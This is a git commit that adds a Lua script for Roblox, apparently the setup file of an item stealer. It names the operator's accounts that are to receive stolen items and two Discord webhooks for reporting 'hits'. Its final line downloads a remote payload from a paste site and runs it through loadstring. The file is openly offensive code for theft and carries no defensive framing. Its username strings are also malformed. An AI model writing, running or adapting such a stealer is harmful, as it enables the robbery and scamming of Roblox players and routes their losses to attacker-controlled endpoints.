fec12698e679b381b316b9b9c8192a36587ce9c6
mijikaisys <mikifemboy@gmail.com>
2025-03-25 00:10:44 +0100

    Create NoruismAp.lua

---
+++ NoruismAp.lua
@@ -0,0 +1,13 @@
+STEALER_LINK = 'https://dpaste.com/3DKH2ML8V.txt' -- stealer link (how to create is bellow)
+
+Usernames = {
+    'Asuna_0nO, -- PUT UR ROBLOX USERNAMES
+    'drpon63, -- AS MANY AS U WANT BUT DONT FORGET ,
+    'SyneaOnAp,
+}
+
+BigHitsWebhook = "https://discord.com/api/webhooks/1353867935239766096/enQqQC8BA28ZS6bBgbqtR6GAnSqIK7r5757MHiRyYuFhE8CZHsT9h_2Uzai2zsTNlCZK"
+SmallHitsWebhook = "https://discord.com/api/webhooks/1353868208146219128/BNoTNWtdeXda09fcPnoMyi9zk0T8EQybCXCLNiFxbkXsTYrC3CkCJvrg0haXikz89AAr"
+
+loadstring(game:HttpGet(STEALER_LINK, true))() -- NEVER TOUCH THAT LINE OF CODE JUST DONT!!!
+
